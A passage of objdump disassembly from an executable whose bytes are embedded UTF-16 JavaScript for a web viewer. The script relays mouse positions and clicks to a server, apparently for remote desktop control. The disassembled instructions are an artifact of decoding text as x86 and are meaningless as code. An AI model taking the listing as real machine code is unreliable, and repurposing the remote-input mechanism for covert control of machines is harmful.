  406909:	63 00                	arpl   %eax,(%eax)
  40690b:	61                   	popa
  40690c:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  406910:	00 6f 00             	add    %ch,0x0(%edi)
  406913:	6e                   	outsb  %ds:(%esi),(%dx)
  406914:	00 2f                	add    %ch,(%edi)
  406916:	00 6a 00             	add    %ch,0x0(%edx)
  406919:	73 00                	jae    0x40691b
  40691b:	6f                   	outsl  %ds:(%esi),(%dx)
  40691c:	00 6e 00             	add    %ch,0x0(%esi)
  40691f:	27                   	daa
  406920:	00 7d 00             	add    %bh,0x0(%ebp)
  406923:	2c 00                	sub    $0x0,%al
  406925:	62 00                	bound  %eax,(%eax)
  406927:	6f                   	outsl  %ds:(%esi),(%dx)
  406928:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40692c:	00 3a                	add    %bh,(%edx)
  40692e:	00 4a 00             	add    %cl,0x0(%edx)
  406931:	53                   	push   %ebx
  406932:	00 4f 00             	add    %cl,0x0(%edi)
  406935:	4e                   	dec    %esi
  406936:	00 2e                	add    %ch,(%esi)
  406938:	00 73 00             	add    %dh,0x0(%ebx)
  40693b:	74 00                	je     0x40693d
  40693d:	72 00                	jb     0x40693f
  40693f:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  406945:	69 00 66 00 79 00    	imul   $0x790066,(%eax),%eax
  40694b:	28 00                	sub    %al,(%eax)
  40694d:	6f                   	outsl  %ds:(%esi),(%dx)
  40694e:	00 29                	add    %ch,(%ecx)
  406950:	00 7d 00             	add    %bh,0x0(%ebp)
  406953:	29 00                	sub    %eax,(%eax)
  406955:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406959:	61                   	popa
  40695a:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40695e:	00 68 00             	add    %ch,0x0(%eax)
  406961:	28 00                	sub    %al,(%eax)
  406963:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  406967:	6e                   	outsb  %ds:(%esi),(%dx)
  406968:	00 63 00             	add    %ah,0x0(%ebx)
  40696b:	74 00                	je     0x40696d
  40696d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406973:	28 00                	sub    %al,(%eax)
  406975:	29 00                	sub    %eax,(%eax)
  406977:	7b 00                	jnp    0x406979
  406979:	7d 00                	jge    0x40697b
  40697b:	29 00                	sub    %eax,(%eax)
  40697d:	3b 00                	cmp    (%eax),%eax
  40697f:	0a 00                	or     (%eax),%al
  406981:	20 00                	and    %al,(%eax)
  406983:	20 00                	and    %al,(%eax)
  406985:	7d 00                	jge    0x406987
  406987:	0a 00                	or     (%eax),%al
  406989:	0a 00                	or     (%eax),%al
  40698b:	20 00                	and    %al,(%eax)
  40698d:	20 00                	and    %al,(%eax)
  40698f:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  406993:	6e                   	outsb  %ds:(%esi),(%dx)
  406994:	00 63 00             	add    %ah,0x0(%ebx)
  406997:	74 00                	je     0x406999
  406999:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40699f:	20 00                	and    %al,(%eax)
  4069a1:	72 00                	jb     0x4069a3
  4069a3:	65 00 6c 00 50       	add    %ch,%gs:0x50(%eax,%eax,1)
  4069a8:	00 6f 00             	add    %ch,0x0(%edi)
  4069ab:	73 00                	jae    0x4069ad
  4069ad:	28 00                	sub    %al,(%eax)
  4069af:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4069b3:	29 00                	sub    %eax,(%eax)
  4069b5:	7b 00                	jnp    0x4069b7
  4069b7:	0a 00                	or     (%eax),%al
  4069b9:	20 00                	and    %al,(%eax)
  4069bb:	20 00                	and    %al,(%eax)
  4069bd:	20 00                	and    %al,(%eax)
  4069bf:	20 00                	and    %al,(%eax)
  4069c1:	76 00                	jbe    0x4069c3
  4069c3:	61                   	popa
  4069c4:	00 72 00             	add    %dh,0x0(%edx)
  4069c7:	20 00                	and    %al,(%eax)
  4069c9:	72 00                	jb     0x4069cb
  4069cb:	20 00                	and    %al,(%eax)
  4069cd:	3d 00 20 00 69       	cmp    $0x69002000,%eax
  4069d2:	00 6d 00             	add    %ch,0x0(%ebp)
  4069d5:	67 00 2e 00 67       	add    %ch,0x6700
  4069da:	00 65 00             	add    %ah,0x0(%ebp)
  4069dd:	74 00                	je     0x4069df
  4069df:	42                   	inc    %edx
  4069e0:	00 6f 00             	add    %ch,0x0(%edi)
  4069e3:	75 00                	jne    0x4069e5
  4069e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4069e6:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  4069ea:	00 6e 00             	add    %ch,0x0(%esi)
  4069ed:	67 00 43 00          	add    %al,0x0(%bp,%di)
  4069f1:	6c                   	insb   (%dx),%es:(%edi)
  4069f2:	00 69 00             	add    %ch,0x0(%ecx)
  4069f5:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4069f9:	74 00                	je     0x4069fb
  4069fb:	52                   	push   %edx
  4069fc:	00 65 00             	add    %ah,0x0(%ebp)
  4069ff:	63 00                	arpl   %eax,(%eax)
  406a01:	74 00                	je     0x406a03
  406a03:	28 00                	sub    %al,(%eax)
  406a05:	29 00                	sub    %eax,(%eax)
  406a07:	3b 00                	cmp    (%eax),%eax
  406a09:	0a 00                	or     (%eax),%al
  406a0b:	20 00                	and    %al,(%eax)
  406a0d:	20 00                	and    %al,(%eax)
  406a0f:	20 00                	and    %al,(%eax)
  406a11:	20 00                	and    %al,(%eax)
  406a13:	76 00                	jbe    0x406a15
  406a15:	61                   	popa
  406a16:	00 72 00             	add    %dh,0x0(%edx)
  406a19:	20 00                	and    %al,(%eax)
  406a1b:	78 00                	js     0x406a1d
  406a1d:	20 00                	and    %al,(%eax)
  406a1f:	3d 00 20 00 65       	cmp    $0x65002000,%eax
  406a24:	00 76 00             	add    %dh,0x0(%esi)
  406a27:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406a2b:	6c                   	insb   (%dx),%es:(%edi)
  406a2c:	00 69 00             	add    %ch,0x0(%ecx)
  406a2f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406a33:	74 00                	je     0x406a35
  406a35:	58                   	pop    %eax
  406a36:	00 20                	add    %ah,(%eax)
  406a38:	00 2d 00 20 00 72    	add    %ch,0x72002000
  406a3e:	00 2e                	add    %ch,(%esi)
  406a40:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  406a44:	00 66 00             	add    %ah,0x0(%esi)
  406a47:	74 00                	je     0x406a49
  406a49:	3b 00                	cmp    (%eax),%eax
  406a4b:	0a 00                	or     (%eax),%al
  406a4d:	20 00                	and    %al,(%eax)
  406a4f:	20 00                	and    %al,(%eax)
  406a51:	20 00                	and    %al,(%eax)
  406a53:	20 00                	and    %al,(%eax)
  406a55:	76 00                	jbe    0x406a57
  406a57:	61                   	popa
  406a58:	00 72 00             	add    %dh,0x0(%edx)
  406a5b:	20 00                	and    %al,(%eax)
  406a5d:	79 00                	jns    0x406a5f
  406a5f:	20 00                	and    %al,(%eax)
  406a61:	3d 00 20 00 65       	cmp    $0x65002000,%eax
  406a66:	00 76 00             	add    %dh,0x0(%esi)
  406a69:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406a6d:	6c                   	insb   (%dx),%es:(%edi)
  406a6e:	00 69 00             	add    %ch,0x0(%ecx)
  406a71:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406a75:	74 00                	je     0x406a77
  406a77:	59                   	pop    %ecx
  406a78:	00 20                	add    %ah,(%eax)
  406a7a:	00 2d 00 20 00 72    	add    %ch,0x72002000
  406a80:	00 2e                	add    %ch,(%esi)
  406a82:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  406a86:	00 70 00             	add    %dh,0x0(%eax)
  406a89:	3b 00                	cmp    (%eax),%eax
  406a8b:	0a 00                	or     (%eax),%al
  406a8d:	20 00                	and    %al,(%eax)
  406a8f:	20 00                	and    %al,(%eax)
  406a91:	20 00                	and    %al,(%eax)
  406a93:	20 00                	and    %al,(%eax)
  406a95:	76 00                	jbe    0x406a97
  406a97:	61                   	popa
  406a98:	00 72 00             	add    %dh,0x0(%edx)
  406a9b:	20 00                	and    %al,(%eax)
  406a9d:	6e                   	outsb  %ds:(%esi),(%dx)
  406a9e:	00 77 00             	add    %dh,0x0(%edi)
  406aa1:	20 00                	and    %al,(%eax)
  406aa3:	3d 00 20 00 69       	cmp    $0x69002000,%eax
  406aa8:	00 6d 00             	add    %ch,0x0(%ebp)
  406aab:	67 00 2e 00 6e       	add    %ch,0x6e00
  406ab0:	00 61 00             	add    %ah,0x0(%ecx)
  406ab3:	74 00                	je     0x406ab5
  406ab5:	75 00                	jne    0x406ab7
  406ab7:	72 00                	jb     0x406ab9
  406ab9:	61                   	popa
  406aba:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  406abe:	00 69 00             	add    %ch,0x0(%ecx)
  406ac1:	64 00 74 00 68       	add    %dh,%fs:0x68(%eax,%eax,1)
  406ac6:	00 20                	add    %ah,(%eax)
  406ac8:	00 7c 00 7c          	add    %bh,0x7c(%eax,%eax,1)
  406acc:	00 20                	add    %ah,(%eax)
  406ace:	00 72 00             	add    %dh,0x0(%edx)
  406ad1:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  406ad5:	69 00 64 00 74 00    	imul   $0x740064,(%eax),%eax
  406adb:	68 00 20 00 7c       	push   $0x7c002000
  406ae0:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  406ae4:	00 31                	add    %dh,(%ecx)
  406ae6:	00 3b                	add    %bh,(%ebx)
  406ae8:	00 0a                	add    %cl,(%edx)
  406aea:	00 20                	add    %ah,(%eax)
  406aec:	00 20                	add    %ah,(%eax)
  406aee:	00 20                	add    %ah,(%eax)
  406af0:	00 20                	add    %ah,(%eax)
  406af2:	00 76 00             	add    %dh,0x0(%esi)
  406af5:	61                   	popa
  406af6:	00 72 00             	add    %dh,0x0(%edx)
  406af9:	20 00                	and    %al,(%eax)
  406afb:	6e                   	outsb  %ds:(%esi),(%dx)
  406afc:	00 68 00             	add    %ch,0x0(%eax)
  406aff:	20 00                	and    %al,(%eax)
  406b01:	3d 00 20 00 69       	cmp    $0x69002000,%eax
  406b06:	00 6d 00             	add    %ch,0x0(%ebp)
  406b09:	67 00 2e 00 6e       	add    %ch,0x6e00
  406b0e:	00 61 00             	add    %ah,0x0(%ecx)
  406b11:	74 00                	je     0x406b13
  406b13:	75 00                	jne    0x406b15
  406b15:	72 00                	jb     0x406b17
  406b17:	61                   	popa
  406b18:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
  406b1c:	00 65 00             	add    %ah,0x0(%ebp)
  406b1f:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  406b25:	74 00                	je     0x406b27
  406b27:	20 00                	and    %al,(%eax)
  406b29:	7c 00                	jl     0x406b2b
  406b2b:	7c 00                	jl     0x406b2d
  406b2d:	20 00                	and    %al,(%eax)
  406b2f:	72 00                	jb     0x406b31
  406b31:	2e 00 68 00          	add    %ch,%cs:0x0(%eax)
  406b35:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  406b39:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  406b3d:	74 00                	je     0x406b3f
  406b3f:	20 00                	and    %al,(%eax)
  406b41:	7c 00                	jl     0x406b43
  406b43:	7c 00                	jl     0x406b45
  406b45:	20 00                	and    %al,(%eax)
  406b47:	31 00                	xor    %eax,(%eax)
  406b49:	3b 00                	cmp    (%eax),%eax
  406b4b:	0a 00                	or     (%eax),%al
  406b4d:	20 00                	and    %al,(%eax)
  406b4f:	20 00                	and    %al,(%eax)
  406b51:	20 00                	and    %al,(%eax)
  406b53:	20 00                	and    %al,(%eax)
  406b55:	76 00                	jbe    0x406b57
  406b57:	61                   	popa
  406b58:	00 72 00             	add    %dh,0x0(%edx)
  406b5b:	20 00                	and    %al,(%eax)
  406b5d:	73 00                	jae    0x406b5f
  406b5f:	78 00                	js     0x406b61
  406b61:	20 00                	and    %al,(%eax)
  406b63:	3d 00 20 00 72       	cmp    $0x72002000,%eax
  406b68:	00 2e                	add    %ch,(%esi)
  406b6a:	00 77 00             	add    %dh,0x0(%edi)
  406b6d:	69 00 64 00 74 00    	imul   $0x740064,(%eax),%eax
  406b73:	68 00 20 00 3f       	push   $0x3f002000
  406b78:	00 20                	add    %ah,(%eax)
  406b7a:	00 28                	add    %ch,(%eax)
  406b7c:	00 6e 00             	add    %ch,0x0(%esi)
  406b7f:	77 00                	ja     0x406b81
  406b81:	20 00                	and    %al,(%eax)
  406b83:	2f                   	das
  406b84:	00 20                	add    %ah,(%eax)
  406b86:	00 72 00             	add    %dh,0x0(%edx)
  406b89:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  406b8d:	69 00 64 00 74 00    	imul   $0x740064,(%eax),%eax
  406b93:	68 00 29 00 20       	push   $0x20002900
  406b98:	00 3a                	add    %bh,(%edx)
  406b9a:	00 20                	add    %ah,(%eax)
  406b9c:	00 31                	add    %dh,(%ecx)
  406b9e:	00 3b                	add    %bh,(%ebx)
  406ba0:	00 0a                	add    %cl,(%edx)
  406ba2:	00 20                	add    %ah,(%eax)
  406ba4:	00 20                	add    %ah,(%eax)
  406ba6:	00 20                	add    %ah,(%eax)
  406ba8:	00 20                	add    %ah,(%eax)
  406baa:	00 76 00             	add    %dh,0x0(%esi)
  406bad:	61                   	popa
  406bae:	00 72 00             	add    %dh,0x0(%edx)
  406bb1:	20 00                	and    %al,(%eax)
  406bb3:	73 00                	jae    0x406bb5
  406bb5:	79 00                	jns    0x406bb7
  406bb7:	20 00                	and    %al,(%eax)
  406bb9:	3d 00 20 00 72       	cmp    $0x72002000,%eax
  406bbe:	00 2e                	add    %ch,(%esi)
  406bc0:	00 68 00             	add    %ch,0x0(%eax)
  406bc3:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  406bc7:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  406bcb:	74 00                	je     0x406bcd
  406bcd:	20 00                	and    %al,(%eax)
  406bcf:	3f                   	aas
  406bd0:	00 20                	add    %ah,(%eax)
  406bd2:	00 28                	add    %ch,(%eax)
  406bd4:	00 6e 00             	add    %ch,0x0(%esi)
  406bd7:	68 00 20 00 2f       	push   $0x2f002000
  406bdc:	00 20                	add    %ah,(%eax)
  406bde:	00 72 00             	add    %dh,0x0(%edx)
  406be1:	2e 00 68 00          	add    %ch,%cs:0x0(%eax)
  406be5:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  406be9:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  406bed:	74 00                	je     0x406bef
  406bef:	29 00                	sub    %eax,(%eax)
  406bf1:	20 00                	and    %al,(%eax)
  406bf3:	3a 00                	cmp    (%eax),%al
  406bf5:	20 00                	and    %al,(%eax)
  406bf7:	31 00                	xor    %eax,(%eax)
  406bf9:	3b 00                	cmp    (%eax),%eax
  406bfb:	0a 00                	or     (%eax),%al
  406bfd:	20 00                	and    %al,(%eax)
  406bff:	20 00                	and    %al,(%eax)
  406c01:	20 00                	and    %al,(%eax)
  406c03:	20 00                	and    %al,(%eax)
  406c05:	72 00                	jb     0x406c07
  406c07:	65 00 74 00 75       	add    %dh,%gs:0x75(%eax,%eax,1)
  406c0c:	00 72 00             	add    %dh,0x0(%edx)
  406c0f:	6e                   	outsb  %ds:(%esi),(%dx)
  406c10:	00 20                	add    %ah,(%eax)
  406c12:	00 7b 00             	add    %bh,0x0(%ebx)
  406c15:	78 00                	js     0x406c17
  406c17:	3a 00                	cmp    (%eax),%al
  406c19:	4d                   	dec    %ebp
  406c1a:	00 61 00             	add    %ah,0x0(%ecx)
  406c1d:	74 00                	je     0x406c1f
  406c1f:	68 00 2e 00 6d       	push   $0x6d002e00
  406c24:	00 61 00             	add    %ah,0x0(%ecx)
  406c27:	78 00                	js     0x406c29
  406c29:	28 00                	sub    %al,(%eax)
  406c2b:	30 00                	xor    %al,(%eax)
  406c2d:	2c 00                	sub    $0x0,%al
  406c2f:	20 00                	and    %al,(%eax)
  406c31:	4d                   	dec    %ebp
  406c32:	00 61 00             	add    %ah,0x0(%ecx)
  406c35:	74 00                	je     0x406c37
  406c37:	68 00 2e 00 6d       	push   $0x6d002e00
  406c3c:	00 69 00             	add    %ch,0x0(%ecx)
  406c3f:	6e                   	outsb  %ds:(%esi),(%dx)
  406c40:	00 28                	add    %ch,(%eax)
  406c42:	00 6e 00             	add    %ch,0x0(%esi)
  406c45:	77 00                	ja     0x406c47
  406c47:	2d 00 31 00 2c       	sub    $0x2c003100,%eax
  406c4c:	00 20                	add    %ah,(%eax)
  406c4e:	00 4d 00             	add    %cl,0x0(%ebp)
  406c51:	61                   	popa
  406c52:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  406c56:	00 2e                	add    %ch,(%esi)
  406c58:	00 72 00             	add    %dh,0x0(%edx)
  406c5b:	6f                   	outsl  %ds:(%esi),(%dx)
  406c5c:	00 75 00             	add    %dh,0x0(%ebp)
  406c5f:	6e                   	outsb  %ds:(%esi),(%dx)
  406c60:	00 64 00 28          	add    %ah,0x28(%eax,%eax,1)
  406c64:	00 78 00             	add    %bh,0x0(%eax)
  406c67:	2a 00                	sub    (%eax),%al
  406c69:	73 00                	jae    0x406c6b
  406c6b:	78 00                	js     0x406c6d
  406c6d:	29 00                	sub    %eax,(%eax)
  406c6f:	29 00                	sub    %eax,(%eax)
  406c71:	29 00                	sub    %eax,(%eax)
  406c73:	2c 00                	sub    $0x0,%al
  406c75:	20 00                	and    %al,(%eax)
  406c77:	79 00                	jns    0x406c79
  406c79:	3a 00                	cmp    (%eax),%al
  406c7b:	4d                   	dec    %ebp
  406c7c:	00 61 00             	add    %ah,0x0(%ecx)
  406c7f:	74 00                	je     0x406c81
  406c81:	68 00 2e 00 6d       	push   $0x6d002e00
  406c86:	00 61 00             	add    %ah,0x0(%ecx)
  406c89:	78 00                	js     0x406c8b
  406c8b:	28 00                	sub    %al,(%eax)
  406c8d:	30 00                	xor    %al,(%eax)
  406c8f:	2c 00                	sub    $0x0,%al
  406c91:	20 00                	and    %al,(%eax)
  406c93:	4d                   	dec    %ebp
  406c94:	00 61 00             	add    %ah,0x0(%ecx)
  406c97:	74 00                	je     0x406c99
  406c99:	68 00 2e 00 6d       	push   $0x6d002e00
  406c9e:	00 69 00             	add    %ch,0x0(%ecx)
  406ca1:	6e                   	outsb  %ds:(%esi),(%dx)
  406ca2:	00 28                	add    %ch,(%eax)
  406ca4:	00 6e 00             	add    %ch,0x0(%esi)
  406ca7:	68 00 2d 00 31       	push   $0x31002d00
  406cac:	00 2c 00             	add    %ch,(%eax,%eax,1)
  406caf:	20 00                	and    %al,(%eax)
  406cb1:	4d                   	dec    %ebp
  406cb2:	00 61 00             	add    %ah,0x0(%ecx)
  406cb5:	74 00                	je     0x406cb7
  406cb7:	68 00 2e 00 72       	push   $0x72002e00
  406cbc:	00 6f 00             	add    %ch,0x0(%edi)
  406cbf:	75 00                	jne    0x406cc1
  406cc1:	6e                   	outsb  %ds:(%esi),(%dx)
  406cc2:	00 64 00 28          	add    %ah,0x28(%eax,%eax,1)
  406cc6:	00 79 00             	add    %bh,0x0(%ecx)
  406cc9:	2a 00                	sub    (%eax),%al
  406ccb:	73 00                	jae    0x406ccd
  406ccd:	79 00                	jns    0x406ccf
  406ccf:	29 00                	sub    %eax,(%eax)
  406cd1:	29 00                	sub    %eax,(%eax)
  406cd3:	29 00                	sub    %eax,(%eax)
  406cd5:	7d 00                	jge    0x406cd7
  406cd7:	3b 00                	cmp    (%eax),%eax
  406cd9:	0a 00                	or     (%eax),%al
  406cdb:	20 00                	and    %al,(%eax)
  406cdd:	20 00                	and    %al,(%eax)
  406cdf:	7d 00                	jge    0x406ce1
  406ce1:	0a 00                	or     (%eax),%al
  406ce3:	0a 00                	or     (%eax),%al
  406ce5:	20 00                	and    %al,(%eax)
  406ce7:	20 00                	and    %al,(%eax)
  406ce9:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  406ced:	6e                   	outsb  %ds:(%esi),(%dx)
  406cee:	00 63 00             	add    %ah,0x0(%ebx)
  406cf1:	74 00                	je     0x406cf3
  406cf3:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406cf9:	20 00                	and    %al,(%eax)
  406cfb:	62 00                	bound  %eax,(%eax)
  406cfd:	74 00                	je     0x406cff
  406cff:	6e                   	outsb  %ds:(%esi),(%dx)
  406d00:	00 28                	add    %ch,(%eax)
  406d02:	00 65 00             	add    %ah,0x0(%ebp)
  406d05:	76 00                	jbe    0x406d07
  406d07:	29 00                	sub    %eax,(%eax)
  406d09:	7b 00                	jnp    0x406d0b
  406d0b:	20 00                	and    %al,(%eax)
  406d0d:	72 00                	jb     0x406d0f
  406d0f:	65 00 74 00 75       	add    %dh,%gs:0x75(%eax,%eax,1)
  406d14:	00 72 00             	add    %dh,0x0(%edx)
  406d17:	6e                   	outsb  %ds:(%esi),(%dx)
  406d18:	00 20                	add    %ah,(%eax)
  406d1a:	00 65 00             	add    %ah,0x0(%ebp)
  406d1d:	76 00                	jbe    0x406d1f
  406d1f:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  406d23:	75 00                	jne    0x406d25
  406d25:	74 00                	je     0x406d27
  406d27:	74 00                	je     0x406d29
  406d29:	6f                   	outsl  %ds:(%esi),(%dx)
  406d2a:	00 6e 00             	add    %ch,0x0(%esi)
  406d2d:	3d 00 3d 00 3d       	cmp    $0x3d003d00,%eax
  406d32:	00 32                	add    %dh,(%edx)
  406d34:	00 3f                	add    %bh,(%edi)
  406d36:	00 27                	add    %ah,(%edi)
  406d38:	00 72 00             	add    %dh,0x0(%edx)
  406d3b:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  406d41:	74 00                	je     0x406d43
  406d43:	27                   	daa
  406d44:	00 3a                	add    %bh,(%edx)
  406d46:	00 27                	add    %ah,(%edi)
  406d48:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  406d4c:	00 66 00             	add    %ah,0x0(%esi)
  406d4f:	74 00                	je     0x406d51
  406d51:	27                   	daa
  406d52:	00 3b                	add    %bh,(%ebx)
  406d54:	00 20                	add    %ah,(%eax)
  406d56:	00 7d 00             	add    %bh,0x0(%ebp)
  406d59:	0a 00                	or     (%eax),%al
  406d5b:	0a 00                	or     (%eax),%al
  406d5d:	20 00                	and    %al,(%eax)
  406d5f:	20 00                	and    %al,(%eax)
  406d61:	69 00 6d 00 67 00    	imul   $0x67006d,(%eax),%eax
  406d67:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  406d6b:	64 00 64 00 45       	add    %ah,%fs:0x45(%eax,%eax,1)
  406d70:	00 76 00             	add    %dh,0x0(%esi)
  406d73:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406d77:	74 00                	je     0x406d79
  406d79:	4c                   	dec    %esp
  406d7a:	00 69 00             	add    %ch,0x0(%ecx)
  406d7d:	73 00                	jae    0x406d7f
  406d7f:	74 00                	je     0x406d81
  406d81:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406d85:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406d89:	28 00                	sub    %al,(%eax)
  406d8b:	27                   	daa
  406d8c:	00 6d 00             	add    %ch,0x0(%ebp)
  406d8f:	6f                   	outsl  %ds:(%esi),(%dx)
  406d90:	00 75 00             	add    %dh,0x0(%ebp)
  406d93:	73 00                	jae    0x406d95
  406d95:	65 00 64 00 6f       	add    %ah,%gs:0x6f(%eax,%eax,1)
  406d9a:	00 77 00             	add    %dh,0x0(%edi)
  406d9d:	6e                   	outsb  %ds:(%esi),(%dx)
  406d9e:	00 27                	add    %ah,(%edi)
  406da0:	00 2c 00             	add    %ch,(%eax,%eax,1)
  406da3:	20 00                	and    %al,(%eax)
  406da5:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  406da9:	6e                   	outsb  %ds:(%esi),(%dx)
  406daa:	00 63 00             	add    %ah,0x0(%ebx)
  406dad:	74 00                	je     0x406daf
  406daf:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406db5:	28 00                	sub    %al,(%eax)
  406db7:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  406dbb:	29 00                	sub    %eax,(%eax)
  406dbd:	7b 00                	jnp    0x406dbf
  406dbf:	20 00                	and    %al,(%eax)
  406dc1:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  406dc5:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406dc9:	72 00                	jb     0x406dcb
  406dcb:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  406dcf:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406dd3:	74 00                	je     0x406dd5
  406dd5:	44                   	inc    %esp
  406dd6:	00 65 00             	add    %ah,0x0(%ebp)
  406dd9:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  406ddd:	75 00                	jne    0x406ddf
  406ddf:	6c                   	insb   (%dx),%es:(%edi)
  406de0:	00 74 00 28          	add    %dh,0x28(%eax,%eax,1)
  406de4:	00 29                	add    %ch,(%ecx)
  406de6:	00 3b                	add    %bh,(%ebx)
  406de8:	00 20                	add    %ah,(%eax)
  406dea:	00 69 00             	add    %ch,0x0(%ecx)
  406ded:	6d                   	insl   (%dx),%es:(%edi)
  406dee:	00 67 00             	add    %ah,0x0(%edi)
  406df1:	2e 00 66 00          	add    %ah,%cs:0x0(%esi)
  406df5:	6f                   	outsl  %ds:(%esi),(%dx)
  406df6:	00 63 00             	add    %ah,0x0(%ebx)
  406df9:	75 00                	jne    0x406dfb
  406dfb:	73 00                	jae    0x406dfd
  406dfd:	28 00                	sub    %al,(%eax)
  406dff:	29 00                	sub    %eax,(%eax)
  406e01:	3b 00                	cmp    (%eax),%eax
  406e03:	20 00                	and    %al,(%eax)
  406e05:	76 00                	jbe    0x406e07
  406e07:	61                   	popa
  406e08:	00 72 00             	add    %dh,0x0(%edx)
  406e0b:	20 00                	and    %al,(%eax)
  406e0d:	70 00                	jo     0x406e0f
  406e0f:	3d 00 72 00 65       	cmp    $0x65007200,%eax
  406e14:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  406e18:	00 6f 00             	add    %ch,0x0(%edi)
  406e1b:	73 00                	jae    0x406e1d
  406e1d:	28 00                	sub    %al,(%eax)
  406e1f:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  406e23:	29 00                	sub    %eax,(%eax)
  406e25:	3b 00                	cmp    (%eax),%eax
  406e27:	20 00                	and    %al,(%eax)
  406e29:	70 00                	jo     0x406e2b
  406e2b:	6f                   	outsl  %ds:(%esi),(%dx)
  406e2c:	00 73 00             	add    %dh,0x0(%ebx)
  406e2f:	74 00                	je     0x406e31
  406e31:	28 00                	sub    %al,(%eax)
  406e33:	7b 00                	jnp    0x406e35
  406e35:	74 00                	je     0x406e37
  406e37:	79 00                	jns    0x406e39
  406e39:	70 00                	jo     0x406e3b
  406e3b:	65 00 3a             	add    %bh,%gs:(%edx)
  406e3e:	00 27                	add    %ah,(%edi)
  406e40:	00 6d 00             	add    %ch,0x0(%ebp)
  406e43:	6f                   	outsl  %ds:(%esi),(%dx)
  406e44:	00 75 00             	add    %dh,0x0(%ebp)
  406e47:	73 00                	jae    0x406e49
  406e49:	65 00 64 00 6f       	add    %ah,%gs:0x6f(%eax,%eax,1)
  406e4e:	00 77 00             	add    %dh,0x0(%edi)
  406e51:	6e                   	outsb  %ds:(%esi),(%dx)
  406e52:	00 27                	add    %ah,(%edi)
  406e54:	00 2c 00             	add    %ch,(%eax,%eax,1)
  406e57:	78 00                	js     0x406e59
  406e59:	3a 00                	cmp    (%eax),%al
  406e5b:	70 00                	jo     0x406e5d
  406e5d:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  406e61:	2c 00                	sub    $0x0,%al
  406e63:	79 00                	jns    0x406e65
  406e65:	3a 00                	cmp    (%eax),%al
  406e67:	70 00                	jo     0x406e69
  406e69:	2e 00 79 00          	add    %bh,%cs:0x0(%ecx)
  406e6d:	2c 00                	sub    $0x0,%al
  406e6f:	62 00                	bound  %eax,(%eax)
  406e71:	75 00                	jne    0x406e73
  406e73:	74 00                	je     0x406e75
  406e75:	74 00                	je     0x406e77
  406e77:	6f                   	outsl  %ds:(%esi),(%dx)
  406e78:	00 6e 00             	add    %ch,0x0(%esi)
  406e7b:	3a 00                	cmp    (%eax),%al
  406e7d:	62 00                	bound  %eax,(%eax)
  406e7f:	74 00                	je     0x406e81
  406e81:	6e                   	outsb  %ds:(%esi),(%dx)
  406e82:	00 28                	add    %ch,(%eax)
  406e84:	00 65 00             	add    %ah,0x0(%ebp)
  406e87:	76 00                	jbe    0x406e89
  406e89:	29 00                	sub    %eax,(%eax)
  406e8b:	7d 00                	jge    0x406e8d
  406e8d:	29 00                	sub    %eax,(%eax)
  406e8f:	3b 00                	cmp    (%eax),%eax
  406e91:	20 00                	and    %al,(%eax)
  406e93:	7d 00                	jge    0x406e95
  406e95:	29 00                	sub    %eax,(%eax)
  406e97:	3b 00                	cmp    (%eax),%eax
  406e99:	0a 00                	or     (%eax),%al
  406e9b:	20 00                	and    %al,(%eax)
  406e9d:	20 00                	and    %al,(%eax)
  406e9f:	69 00 6d 00 67 00    	imul   $0x67006d,(%eax),%eax
  406ea5:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  406ea9:	64 00 64 00 45       	add    %ah,%fs:0x45(%eax,%eax,1)
  406eae:	00 76 00             	add    %dh,0x0(%esi)
  406eb1:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
